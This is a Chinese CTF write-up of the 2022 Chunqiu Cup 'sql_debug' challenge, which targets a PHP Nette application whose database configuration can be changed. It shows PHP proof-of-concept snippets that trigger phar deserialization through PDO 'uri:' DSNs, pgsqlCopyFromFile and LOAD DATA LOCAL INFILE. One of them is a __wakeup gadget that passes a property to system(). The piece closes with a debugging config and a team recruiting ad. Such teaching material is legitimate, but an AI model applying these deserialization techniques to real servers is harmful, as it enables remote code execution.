# 2022春秋杯联赛 传说殿堂赛道 sql_debug题目解析

> 原文: https://www.ctfiot.com/39732.html
> ID: 39732

，

点击蓝字 ·  关注我们

01

前言

02

sql_debug sql_debug 题⽬介绍

在这次2022年春秋杯联赛中，我出了⼀道 sql_debug 赛题。本题环境是 Nette Web ，⼀个PHP框架应⽤。我在环境⾥放了⼀个 install.php 可以修改框架的配置⽂件。

在控制器中呢也可以看到存在⼀个SQL注⼊的⽅法

我在环境⾥没有放置mysql 所以sql注⼊这个地⽅是⾏不通的。在⾼版本php⾥即使是在数据库配置可控的情况下尝试使⽤恶意mysql服务器读取⽂件也是不可以的。选⼿们到这⾥就应该思考 在配置⽂件可控的情况下有什么办法接管服务器了。结合题意我们可以对 Nette 的数据库初始化代码进⾏分析，你可以发现数据库是使⽤pdo进⾏连接的。

source/vendor/nette/database/src/Database/Connection.php

<?php$pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres","sx", "123456"));@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');

<?phpclass A {public $s = '';public function __wakeup () {system($this->s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE 'phar://test.phar/test' INTO TABLE a LINESTERMINATED BY 'rn' IGNORE 1 LINES;');

那么有没有⼀种可能，还有其他的 phar 利⽤⽅式呢？

03

dsn_from_uri 触发phar反序列化

我们跟进php源码 搜索 phar 反序列化的⼊⼝函数。

跟进该函数 可以发现直接调⽤了实参 uri

<?phpinclude_once "classTest.php";$dbms='mysql';$host='localhost';$dbName='test';$user='root'; $pass='';$dsn="uri:phar://phar.phar/$dbms:host=$host;dbname=$dbName";try {$dbh = new PDO($dsn, $user, $pass);$dbh = null;} catch (PDOException $e) {die ("Error!: " . $e->getMessage() . "<br/>");}$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));?>

到这⾥这道题的解法就⾮常明朗了，接下来只需要挖⼀条 Nette 的链⼦写⼊ install.lock 打Phar就好。链⼦较为简单 不是本文的重点 这里就不贴POC了。

04

Linux下PHP内核调试⼩知识

vscode的调试配置⽂件⾥ 可以把参数配置为 -S 这样就可以启动web服务，⾮常的⽅便调试。

{// 使⽤ IntelliSense 了解相关属性。// 悬停以查看现有属性的描述。// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387"version": "0.2.0","configurations": [{"name": "(lldb) Debug","type": "cppdbg","request": "launch","program": "/usr/local/php7.1.33/bin/php","args": ["-S","0:10001"],"stopAtEntry": false,"cwd": "${workspaceRoot}/html/", } ] }

05

个⼈总结

鸡肋 只适合CTF

互联⽹没看到有⼈发 算是⼀个新的知识点

重点来了

你是否想要加入一个安全团

拥有更好的学习氛围？

那就加入EDI安全，这里门槛不是很高，但师傅们经验丰富，可以带着你一起从基础开始，只要你有持之以恒努力的决心

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事，我们在为打造安全圈好的技术氛围而努力，这里绝对是你学习技术的好地方。这里门槛不是很高，但师傅们经验丰富，可以带着你一起从基础开始，只要你有持之以恒努力的决心，下一个CTF大牛就是你。

欢迎各位大佬小白入驻，大家一起打CTF，一起进步。

我们在挖掘，不让你埋没！

你的加入可以给我们带来新的活力，我们同样也可以赠你无限的发展空间。

有意向的师傅请联系邮箱root@edisec.net（带上自己的简历，简历内容包括自己的学习方向，学习经历等）

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
source/vendor/nette/database/src/Database/Connection.php
```



```
<?php$pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres","sx", "123456"));@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
```



```
<?phpclass A {public $s = '';public function __wakeup () {system($this->s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE 'phar://test.phar/test' INTO TABLE a LINESTERMINATED BY 'rn' IGNORE 1 LINES;');
```



```
<?phpinclude_once "classTest.php";$dbms='mysql';$host='localhost';$dbName='test';$user='root'; $pass='';$dsn="uri:phar://phar.phar/$dbms:host=$host;dbname=$dbName";try {$dbh = new PDO($dsn, $user, $pass);$dbh = null;} catch (PDOException $e) {die ("Error!: " . $e->getMessage() . "<br/>");}$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));?>
```



```
{// 使⽤ IntelliSense 了解相关属性。// 悬停以查看现有属性的描述。// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387"version": "0.2.0","configurations": [{"name": "(lldb) Debug","type": "cppdbg","request": "launch","program": "/usr/local/php7.1.33/bin/php","args": ["-S","0:10001"],"stopAtEntry": false,"cwd": "${workspaceRoot}/html/", } ] }
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/5-1652236979.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/5-1652236979.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/8-1652236980.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/8-1652236981.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/0-1652236981.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/3-1652236982.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/6-1652236983.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/0-1652236983.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/1-1652236984.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/10-1652236985.png)